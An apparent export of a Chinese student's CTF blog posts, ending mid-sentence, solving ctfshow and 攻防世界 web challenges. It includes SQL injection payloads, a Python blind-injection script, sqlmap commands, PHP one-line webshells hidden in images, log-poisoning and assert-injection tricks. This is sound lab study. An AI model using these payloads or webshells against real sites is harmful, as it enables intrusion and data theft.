[{"title":"ctfshow web2,web3","url":"/2020/10/27/12/","content":"## 划水博客第十二但\n\n要向大佬看齐，学python了\n\n##### 级客大挑战=科学记数法\n\n打开链接，页面显示\n\n![image-20201018230331606](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201018230331606.png)\n\n我们得输入a,b两个东西，使得`strcmp(a,b)`比较两个时报错，输出`null`。\n\n<u>（`strmp()`函数是能比较字符但不能比较数组）</u>\n\n所以我们可以构造数组使其报错，输出null。\n\n最后输入`a[]=1&b[]=\"h\"`即可过第一关。\n\n![image-20201018231356634](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201018231356634.png)\n\n我们需要输入一个东西c但c不是数字等于123。。迷惑的抓抓头。还好寝室有大佬。。我们可以用php里的科学计数法\n\n```\n简单的来说就是\n123e0=123    ===表示的是123X10^0（123乘10的0次方）但前面的123e0不能被识别为数字。\n```\n\n所以输入`c=123e0`发现是错的，在输入`c=123e`执行成功。\n\n#### ctfshow==web2\n\n提示：简单的sql注入，打开链接：发现是一个登入界面，根据提示时sql注入在用户名处尝试注入；\n\n先尝试`1 and 1=1 `,`1 and 1=2`没有回显，排除整数型注入\n\n尝试字符注入使用万能代码`1'or 1=1 #`发现回显![image-20201027200057685](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201027200057685.png)\n\n接着查找字段`1' or 1=1 union select 1,2,3 #`![image-20201027200405776](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201027200405776.png)发现在2处可以输入字段，\n\n后面基本操作 --数据库：：`1' or 1=1 union select 1,database(),3#`![image-20201027200649923](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201027200649923.png)\n\n表名：：`1' or 1=1 union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=\"web2\"#`![image-20201027201011851](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201027201011851.png)\n\n字段名：：`1' or 1=1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=\"flag\"#`![image-20201027201309961](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201027201309961.png)\n\n字段内容：：`1' or 1=1 union select 1,flag,3 from flag#`![image-20201027201411416](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201027201411416.png)\n\n以上是手工注入。我们也可以使用sqlmap跑，但这个是post请求，所有抓包、保存为txt文件，再跑。具体看[这个](https://overnight-miss-you.github.io/2020/10/15/9/)的最后\n\n*在执行`python sqlmap.py -r 1.txt --dbs`查找表数据库*\n\n*执行`python sqlmap.py -r 1.txt -D news --dump`打开数据库就能找到flag了。*\n\n#### ctfshow==web3\n\n打开链接：页面显示![image-20201027203556988](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201027203556988.png)可能是文件包含题。\n\n使用代码测试`/../../../../../../../../etc/passwd`发现有回显。\n\n直接使用伪协议：：`php://input`上传一个`<?php system(\"ls”);?>`查看本地内容。\n\n出现flag的位置 用 `cat`打开即可。\n\n下面简单的说一下文件包含漏洞：文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。\n\nphp 中引发文件包含漏洞的通常是以下四个函数：\n\n**`include()`** 当使用该函数包含文件时，只有代码执行到 `include()` 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。\n\n**`include_once()`** 功能和 `include()` 相同，区别在于当重复调用同一文件时，程序只调用一次。\n\n**`require()`** 只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行\n\n**`require_once()`** 它的功能与 `require()` 相同，区别在于当重复调用同一文件时，程序只调用一次。\n\n类似本地包含题的解题：\n\n可以通过遍历来打开文件：：`./../../../../---`\n\n或者使用为协议`php://fliter` ,`flie://`+ 文件路径也可以访问\n\n需要上传图片文件的可以：：在cmd中 执行 `copy 1.jpg/b + 2.php 3.jpg`来生成图片码==php文件中含有一句话木马\n\n```\n<?php eval(_POST[\"a\"];?>\n```\n\n最后用蚁剑连接。\n\n当可以访问本地日志文件时：可以将一句话木马放到![image-20201027214339687](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201027214339687.png)最后用蚁剑连接。\n\n```\n注意：：放日志文件的一般在\n/etc/httpd/logs/access_log\n或者\n/var/log/httpd/access log\n\nproc/self/environ 中会保存 user-agent 头。如果在 user-agent 中插入 php 代码，则 php 代码会被写入到 environ 中。之后再包含它\n```\n\n当然上面使用的伪协议也是可以的。具体的[伪协议](https://overnight-miss-you.github.io/2020/10/06/php-input/)\n\n### ！！！这次的划水博客就到这里了，我要陪薇尔莉特emmmm去找少佐了（唯一不敢叫老婆的  我不配）！！！！\n\n![1=0](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/1=0.jpg)\n\n![wg](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/wg.gif)"},{"title":"攻防世界刷题 easytornado，mfw，极客大挑战","url":"/2020/10/17/11/","content":"## 划水博客第十一D\n\n成功混为划水队第一番队队长。\n\n##### 1==easytornado\n\n*Tornado是一种 Web 服务器软件的开源版本。Tornado 和主流Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。*\n\n打开连接，发现三个txt文件。\n\n![image-20201017111021992](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017111021992.png)\n\n![image-20201017111129014](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017111129014.png)\n\n想尝试一下：：直接打开`/fllllllllllllag`。。直接报错了（划线需要记一下，要考的）\n\n![image-20201017113614230](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017113614230.png)\n\n看到第二个提示是`render`(服务器渲染函数)。可能是模板注入；\n\n然后又跑回报错处，把Error改为其他的看看，发现这里就是模板注入点。。[大佬nb](https://blog.csdn.net/hxhxhxhxx/article/details/107475107?utm_medium=distribute.pc_relevant.none-task-blog-utm_term-3&spm=1001.2101.3001.4242)\n\n![image-20201017113748107](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017113748107.png)\n\n分析一下：：\n\n```php\nmd5(cookie_secret+md5(filename))//即先将filenamemd5加密，再将cookie_secret与md5加密后的filename进行md5加密。\n```\n\n我们已经知道flag在哪了，只要知道`cookie_secret`就行了。。。。又是不知道的东西。。\n\n![img](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/040D3312.jpg)\n\n看大佬的wp才知道：：在`ornado`模板里可以使用`handler.settings`来访问`cookie_secret`。\n\n```php\nmsg={{handler.settings}}//得到cookie_secret\n```\n\n![image-20201017114511116](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017114511116.png)\n\n然后通过md5加密就好了\n\n![image-20201017123449904](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017123449904.png)\n\n最后输入`?filename=/fllllllllllllag&filehash=2d1574db11b73f3f45e33b484b2297b2`即可到的flag。\n\n##### 2==mfw\n\n打开链接。三个标题都点一下。发现了一点可疑的地方。\n\n![image-20201017212012453](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017212012453.png)\n\n用dirsearch 扫一下；发现，存在`.git`泄露\n\n![image-20201017212357409](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017212357409.png)\n\n使用Githacker下载文件；\n\n`python3 GitHacker.py http://220.249.52.133:33512/.git/`(后面四个是在templates文件夹中)\n\n![image-20201017212750260](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017212750260.png)\n\n打开flag.php文件，什么都么有。在打开index.php，发现php的源代码。抓头分析一下。。\n\n```php\n<?php\n\nif (isset($_GET['page'])) {\n\t$page = $_GET['page'];\n} else {\n\t$page = \"home\";\n}\n\n$file = \"templates/\" . $page . \".php\";\n\n// I heard '..' is dangerous!\nassert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");//不能有..不然就退出。\n    //assert会将字符串当做代码来执行。所以我们知道在第一波就构造处前面错后面对的代码就可能可行\n// TODO: Make this look nice\nassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");\n\n?>\n```\n\n所以构造：：`page=123')or system(\"cat templates/flag.php\");//`\n\n```\n解释一下：\n\n我们输入的：：page=123')or system(\"cat templates/flag.php\");//\n实际上传的：：assert(\"strpos('templates page=123')(闭合前面的')并报错执行后面的代码）or system(\"cat templates/flag.php\");// (到这直接停，，注释掉后面).php)===false\") or die(\"Detected hacking attempt!\");\n\n```\n\n最后在源代码中看到flag。\n\n###### 极客大挑战\n\n打开链接，啥都没有。基本习惯`F12`。在HackBar中使用POST请求时显示了源代码（瞎猫碰到死耗子）。\n\n接着又是抓头分析代码\n\n```php\n <?php\nerror_reporting(0);\nif ($_SERVER['REQUEST_METHOD'] !== 'POST') {//只能是post请求才行。。\nheader(\"HTTP/1.1 405 Method Not Allowed\");\nexit();\n} else {\n    \n    if (!isset($_POST['roam1']) || !isset($_POST['roam2'])){//需要同时post两个值roam1和roam2\n        show_source(__FILE__);\n    }\n    else if ($_POST['roam1'] !== $_POST['roam2'] && sha1($_POST['roam1']) === sha1($_POST['roam2'])){\n        //roam1和roam2不能相等并且通过sha1加密后还要相等。。。后来寝室大佬说可以让 sha1只能处理字符串，不能处理数组。所以可以把roam1.roam2构造成数组，使两边同时报错，变向相等。就可以绕过了。大佬nb！！！\n        phpinfo();  // collect information from phpinfo!\n    }\n} \n```\n\n![image-20201017221220426](C:\\Users\\86159\\AppData\\Roaming\\Typora\\typora-user-images\\image-20201017221220426.png)\n\n跳转到phpinfo();在里面找有没有flag。找到了\n\n![image-20201017221517641](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017221517641.png)\n\n试着打开。\n\n![image-20201017221647100](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017221647100.png)\n\n报错了？？？   假的！！！  真的报错：\n\n![image-20201017222000523](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201017222000523.png)\n\n这波操作秀的一批。。\n\n最后在响应头中发现flag。\n\n#### ！！！！这个次的划水博客就到这了，我要去陪楪祈(ye qi)去玩花绳了！！！！(ｏ^-^)尸~''☆ミ☆ミ\n\n![3110](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/3110.jpg)\n\n![indaex](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/indaex.jpg)\n\n![asdAesfa](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/asdAesfa.gif)"},{"title":"攻防世界刷题 php2,upload1","url":"/2020/10/16/10/","content":"## 划水博客第十單\n\n依旧是在攻防世界看wp划水。\n\n##### 1==PHP2\n\n打开链接。只有一段![image-20201016193914052](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016193914052.png)\n\n首先基本操作。`F12`，没啥子发现。接着扫描一下目录。\n\n简单说做个笔记。使用dirsearch扫描的代码：`python dirsearch.py -u +网址+ -e * `,加上`-s 1`会仔细点。\n\n结果只发现一个`index.php`。。没啥子用呀。（我用御剑也扫不到.phps的文件。。）\n\n![img](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/00B7F523.png)\n\n`phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。`\n\n得到主页的源码。掉头发分析一波。\n\n```php\n<?php\nif(\"admin\"===$_GET[id]) {//id不能=admin\n  echo(\"<p>not allowed!</p>\");\n  exit();\n}\n\n$_GET[id] = urldecode($_GET[id]);//通过url解码一次后\nif($_GET[id] == \"admin\")//要==admin,,所以只要编码一个字符就可以了；\n{           //a的URL编码是%61..因为上面需要解码，所以我们需要加密一次%2561；\n  echo \"<p>Access granted!</p>\";\n  echo \"<p>Key: xxxxxxx </p>\";\n}\n?>\n\nCan you anthenticate to this website?\n\n```\n\n输入`id=%2561dmin`即可得到flag。\n\n##### 2==upload1\n\n打开链接。一个文件上传的接口。随便上传一个txt文件。提示只能上传一张图片。\n\n想到将一句话代码放到图片里上传，在用蚁剑连接。想到就干。\n\n首先在txt文件下写入一句话代码..`<?php @eval(_POST[\"a\"];?>`,并改成php文件\n\n在随便搞个图片，使用cmd将将两个合成为一个图片码；\n\n![image-20201016212806501](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016212806501.png)\n\n在上传文件，并抓包。\n\n![image-20201016213220948](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016213220948.png)\n\n![](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016213313926.png)\n\n显示上传成功。在用蚁剑连接。\n\n![image-20201016213633996](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016213633996.png)\n\n后面有尝试了一下，随便上传一张图，抓包，把图片内容改为一句话木马，在改为php格式也行。\n\n![image-20201016214407848](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016214407848.png)\n\n#### ！！！这次的划水博客就这样完了，头发掉一把，去跟五胞胎老婆们出去蜜个月，11个人回！！！(σﾟ∀ﾟ)σ..:*☆ \n\n![1](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/r1200.jpg)\n\n![2](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/ter1200.jpg)\n\n![3](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/0_master1200.jpg)\n\n![4](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/8_p0_master1200.jpg)\n\n![5](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/951_p0_master1200.jpg)"},{"title":"攻防世界刷题 web,newscenter","url":"/2020/10/15/9/","content":"## 划水博客第九单\n\n这次依旧在攻防世界划水\n\n##### 1==web2\n\n提示：解密。。打开链接，发现一大段代码。抓头发分析一下。\n\n```php\n<?php\n$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";\n\nfunction encode($str){\n    $_o=strrev($str);//翻转字符串。\n    // echo $_o;\n        \n    for($_0=0;$_0<strlen($_o);$_0++){//遍历字符串\n       \n        $_c=substr($_o,$_0,1);//输出每次遍历的字符--在$_o里,从$_0开始,输出1个字符。\n        $__=ord($_c)+1;//转换成ASCll并加1\n        $_c=chr($__);//在转换回字符（因为ASCLLL+1）\n        $_=$_.$_c;   //最后拼接\n    } \n    return str_rot13(strrev(base64_encode($_)));//输出\n}\n\nhighlight_file(__FILE__);\n/*\n   逆向加密算法，解密$miwen就是flag\n*/\n?> \n```\n\n然后写出它的逆向解密过程。\n\n```php\n<?php\n$sa=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";\n$b= base64_decode(strrev(str_rot13($sa)));//把上面的过程倒过来执行一遍即可。\n\n$c=null;//用来存放字符串\n for($_0=0;$_0<strlen($b);$_0++){//遍历字符串\n    $d=substr($b,$_0,1);//输出每次遍历的字符--在$b里,从$_0开始,输出1个字符。\n    $h=ord($d)-1;//转换成ASCll并减1（上面加1，减1变回去）\n    $d=chr($h);//在转换回字符\n    $c=$c.$d;\n}\necho strrev($c);//上面开头逆转一次，所以在最后也要逆转一次。\n?>\n```\n\n执行即可得到flag。\n\n<u>**{`base64_encode`为加密，`base64_decode`为解密`ord`为将字符转为`ASCll`值`chr`为将`ASCll`转为字符}**</u>\n\n##### 2==NewsCenter\n\n打开链接，是一个输入口，猜测是sql注入。简单尝试一下`1`。`1'`。后面出错。大概率是字符注入。\n\n尝试`1'and1=1#`成功，但无输出。在尝试`1'or 1=1#`显示6条。\n\n接着查询数据列数。`1'union select 1#`出错，`1'union select 1，2#`，`1'union select 1,2,3#`有回显。有两列\n\n![image-20201015222412845](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201015222412845.png)\n\n接着就正常操作：\n\n爆破数据库：`1' union select 1,2,database()#`得到数据库名\n\n接着爆破数据表:`1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#`得到![image-20201015222724444](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201015222724444.png)这么有点“此地无银三百两”的感觉\n\n接着爆破列名：`1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='secret_table'#`得到![image-20201015222925693](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201015222925693.png)\n\n打开fl4g就行了:`1' union select 1,2,group_concat(fl4g)from secret_table#`得到flag。\n\n当然，菜鸡的我肯定是想用sqlmap的。\n\n当注入时是通过GET请求的。可以直接\n\n```\n得到表：python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 --tables\n \n得到表列：python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 -T flag --columns\n \n打开表列文件：python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 -T flag -C flag --dump\n```\n\n但是这个题是使用post请求的。。\n\n先抓个包。将内容保存到txt文件中，并放到sqlmap文件夹下。  \n\n![image-20201015233054009](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201015233054009.png)\n\n在执行`python sqlmap.py -r 1.txt --dbs`查找表数据库\n\n执行`python sqlmap.py -r 1.txt -D news --dump`打开数据库就能找到flag了。\n\n#### ！！！！这次的划水博客就到这里了，我要和真白去睡觉了！！！！⊂(‘ω’⊂ )))Σ≡=─༄༅༄༅༄༅༄༅༄༅\n\n![64875142_p0](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/64875142_p0.jpg)\n\n![timedag](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/timedag.gif)"},{"title":"攻防世界刷题 ics,war,nann","url":"/2020/10/14/8/","content":"## 菜鸡博客第巴蛋\n\n菜鸡的我在攻防世界看wp划水\n\n## 菜鸡博客第巴蛋\n\n菜鸡的我在攻防世界看wp划水\n\n##### 1==ics-06\n\n题目提示为：![image-20201014160124862](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014160124862.png)\n\n打开链接，发现好壮观。随机点击了一些，发现只有报表中心有用\n\n![image-20201014160453509](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014160453509.png)\n\n并且这日期选择后无效。\n\n最后看到![image-20201014160706303](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014160706303.png)并且说是送分题，尝试性的抓包去爆破一下。\n\n具体的爆破过程这里略过。简单的说一下怎用Excel制作1--1000或者1---10000的密码.txt\n\n![image-20201014161508481](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014161508481.png)\n\n在保存为txt格式即可。最后把爆出的id输入即可得到flag。\n\n！！！！寝室大佬有教了个跟简单的方法！！！\n\n![image-20201016203842452](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201016203842452.png)\n\n##### 2==warmup\n\n打开链接。只有一张图片。。。`F12`一下，发现一个`source.php`![image-20201014170755143](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014170755143.png)打开。发现一大段源代码。。\n\n不过，在开头还有一个`hint.php`打开看看。。。。。得到有flag的名称\n\n![image-20201014171143658](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014171143658.png)\n\n最后还是要分析代码：：![img](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/0C1B7B49.jpg)\n\n```php\n <?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&$page)\n        {\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {//isset 判断是否存在psge(简单的说就是判断是否为空)\n                echo \"you can't see it\";//is_string 判断输入的是否为字符串。\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {//需要构造开头为source.php或者hint.php的请求。\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')//从`?`的地方输出；\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);//输入的需要进行url编码。\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"<br><img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n    }  \n?> \n```\n\n<u>*`is_string:`如果指定变量为字符串，则返回 TRUE，否则返回 FALSE。*</u>\n\n<u>*`isset:`查看变量是否被设置，（就是有没有这个变量）*</u>\n\n<u>*in_array(xxx,uuu) ：在uuu中搜索xxx，存在返回true*</u>\n\n<u>*`mb_substr(xxxx,0,2):`在xxx中从第0个字符开始输出两个*</u>\n\n <u>*`mb_strpos（xxxx,‘as’）:`在xxx中as第一次出现的位置*</u>\n\n根据以上分析。我们可以构造一个：`file=source.php\\\\hint.php?/ffffllllaaaagggg`执行没有flag，可能不在这个目录\n\n尝试后发现`file=source.php\\\\hint.php?/../../../../ffffllllaaaagggg`才能有flag。（刚好四个`../`）\n\n![img](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/0C9591FC.jpg)\n\n当你多输入一些`../`时，你会发现flag依然可以输出。这里有是强大的`include`的作用了![image-20201014193207454](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014193207454.png)\n\n![image-20201014193451522](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014193451522.png)\n\n但是我尝试时。无法输出flag的值。。\n\n##### 3==NaNNaNNaNNaN-Batman\n\n没有链接，下载文件。没有后缀。名字叫web。所以尝试加php。打开后是一个输入框，输啥搜没有回显\n\n用txt打开文件显示的代码，。。。。有些乱码了，也看不懂。。。![image-20201014210621444](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014210621444.png)\n\n看[大佬wp](https://blog.csdn.net/zz_Caleb/article/details/89283180)，才发现这是js文件。。可惜我啥都不会![img](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/0CEE343B.gif)\n\n仔细查看这段js代码后，发现最后有个`eval()`函数执行了前面的代码。(可计算某个字符串，并执行java代码)\n\n猜测是前面代码中的一些字符被`eval()函数`计算了，所以乱码。\n\n将代码中的`eval()`函数换成`alert()`{这个是弹窗的意思}可将js代码完整显示出来(记得头和结尾的`script`去掉)\n\n![image-20201014211928768](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014211928768.png)\n\n![image-20201014212252632](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014212252632.png)\n\n知道是js文件只要把它在排版一下应该就看的清了。\n\n```js\nfunction $()\n   {var e=document.getElementById(\"c\").value;\n     if(e.length==16)//e的长度要16\n   if(e.match(/^be0f23/)!=null)//`^`为开头  所以要以 `be0f23`开头\n   if(e.match(/233ac/)!=null)//需要包含`233ac`\n   if(e.match(/e98aa$/)!=null)//`$`为结尾  所以 要以`e98aa`结尾\n   if(e.match(/c7be9/)!=null)//需要包含`c7be9`\n      ///所以是字符串`be0f23ac7be98aa`  23 c e9 是共用才能是16\n {var t=[\"fl\",\"s_a\",\"i\",\"e}\"];\n  var n=[\"a\",\"_h0l\",\"n\"];\n  var r=[\"g{\",\"e\",\"_0\"];\n  var i=[\"it'\",\"_\",\"n\"];\n  var s=[t,n,r,i];\nfor(var o=0;o<13;++o)\n{document.write(s[o%4][0]);\ns[o%4].splice(0,1)}///或者可以直接跑着代码--var开始，\n }}\ndocument.write('<input id=\"c\"><button onclick=$()>Ok</button>');\ndelete _\n\n```\n\n还记的刚开始的那个输入框吗！！只要把字符串`be0f23ac7be98aa`输入就可以得到flag。\n\n或者直接跑代码来得到flag。\n\n![image-20201014215039653](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201014215039653.png)\n\n#### ！！！！这次的划水博客就到这了，我要和艾拉去睡觉了。！！！(((((((((((っ•ω•)っ Σ(σ｀•ω•´)σ \n\n![222rwa](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/222rwa.png)\n\n![timaag](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/timaag.gif)"},{"title":"布尔.时间.堆叠注入","url":"/2020/10/12/jjx/","content":"\n## 菜鸡博客第七彈\n\n这次接着总结常见的sql注入\n\n##### 时间盲注\n\n在不知道提示时，可以利用`sleep()`或`benchmark()`等函数让mysql执行时间变长经常与`if(expr1,expr2,expr3)`语句结合使用，通过页面的响应时间来判断条件是否正确。`if(expr1,expr2,expr3)`含义是如果`expr1`是True,则返回`expr2`,否则返回`expr3`。\n\n我们就可以在`expr1`中写入猜想，通过执行代码来判断我们的猜想是否正确。\n\n例如：输入`1 and if(length(database())>=8,sleep(5),1)`执行，发现页面相应时间变长约5秒。则数据库长度大于等于8.，接着放大数字来确定数据库名长度。\n\n爆破数据库:`1 and if(substr(database(),1,1)='a',sleep(5),1)`在a处爆破：时间最长的为正确。\n\n![image-20201012170312840](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012170312840.png)\n\n​    在爆破第二个字符是把`(database(),1,1)`改为`(database(),1,2)`即可。之后以此类推。\n\n猜测数据表的个数：`1 and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(3),1)`(2处可以修改)。\n\n爆破表名：`1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='a',sleep(3),1)`(与上方类似)  更改`limit 0,1)`为`limit 1,1)`即可爆破第二个表。。\n\n猜测数字段数量：`1 and if((select count(column_name) from information_schema.columns where table_name='flag')=1,sleep(3),1)`(1处可以修改)。\n\n爆破字段名：`1 and if(ascii(substr((select column_name from information_schema.columns\n where table_name='flag'),1,1))='a',sleep(3),1)`\n\n大佬爆破盲注使用的半自动脚本（大佬nb）\n\n```python\nimport requests\nimport time\n\nurlOPEN = 'http://challenge-80bbba4d1e9ce716.sandbox.ctfhub.com:10080/?id='\nstarOperatorTime = [] \nmark = 'query_success'\n \ndef database_name():\n\tname = ''\n\tfor j in range(1,9):\n\t\tfor i in 'sqcwertyuioplkjhgfdazxvbnm':\n\t\t\turl = urlOPEN+'if(substr(database(),%d,1)=\"%s\",1,(select table_name from information_schema.tables))' %(j,i)  //可根据题，自行修改。\n            # print(url+'%23')\n\t\t\tr = requests.get(url)\n\t\t\tif mark in r.text:\n\t\t\t\tname = name+i\n\t\t\t\t\n\t\t\t\tprint(name)\n\t\t\t\t\n\t\t\t\tbreak\n\tprint('database_name:',name)\n\t\n\t\t\n\t\ndatabase_name()\n \ndef table_name():\n    list = []\n    for k in range(0,4):\n        name=''\n        for j in range(1,9):\n            for i in 'sqcwertyuioplkjhgfdazxvbnm':\n                url = urlOPEN+'if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=\"%s\",1,(select table_name from information_schema.tables))' %(k,j,i)\n\t\t\t    # print(url+'%23')\n                r = requests.get(url)\n                if mark in r.text:\n                    name = name+i\n                    break\n        list.append(name)\n    print('table_name:',list)\n\n#start = time.time()\ntable_name()\n#stop = time.time()\n#starOperatorTime.append(stop-start)\n#print(\"所用的平均时间： \" + str(sum(starOperatorTime)/100))\n\ndef column_name():\n    list = []\n    for k in range(0,3): #判断表里最多有4个字段\n        name=''\n        for j in range(1,9): #判断一个 字段名最多有9个字符组成\n            for i in 'sqcwertyuioplkjhgfdazxvbnm':\n                url=urlOPEN+'if(substr((select column_name from information_schema.columns where table_name=\"flag\"and table_schema= database() limit %d,1),%d,1)=\"%s\",1,(select table_name from information_schema.tables))' %(k,j,i)\n                r=requests.get(url)\n                if mark in r.text:\n                    name=name+i\n                    break\n        list.append(name)\n    print ('column_name:',list)\n\ncolumn_name()\n\ndef get_data():\n        name=''\n        for j in range(1,50): #判断一个值最多有51个字符组成\n            for i in range(48,126):\n                url=urlOPEN+'if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))' %(j,i)\n                r=requests.get(url)\n                if mark in r.text:\n                    name=name+chr(i)\n                    print(name)\n                    break\n        print ('value:',name)\n    \nget_data()\n```\n\n##### 布尔盲注\n\n与上面的时间盲注类似\n\n我这写一个代码其他的将上面的代码修改即可。思路一致。\n\n爆破数据库:`1 and substr(database(),1,1)='a'`\n\n##### 堆叠查询注入\n\n堆叠查询注入：堆叠查询可以执行多条SQL语句，语句之间以分号(;)隔开。而堆叠查询注入攻击就是利用此特点，在第二条语句中构造自己要执行的语句。\n\n研究了一下强网杯2019随便注，发现还是不太懂  防止忘记  在总结一下------>>[大佬博客](https://blog.csdn.net/qq_45521281/article/details/105822498?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160250320419195240449315%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160250320419195240449315&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v2-22-105822498.first_rank_ecpm_v3_pc_rank_v2&utm_term=%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5&spm=1018.2118.3001.4187)\n\n输入`1`没有回显，输入`1'`，回显![image-20201012203938068](http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012203938068.png)\n\n输入`1'and1=1#`没有回显，尝试`1' or 1=1#`有回显\n\n<img src=\"http://cdn.jsdelivr.net/gh/overnight-miss-you/test/image-20201012210056106.png\" alt=\"image-20201012210056106\" style=\"zoom:80%;\" />\n\n判断字段数`1'order by  2#`有回显`1'order by 3#`没有回显。\n\n联合查询字段`1'union select 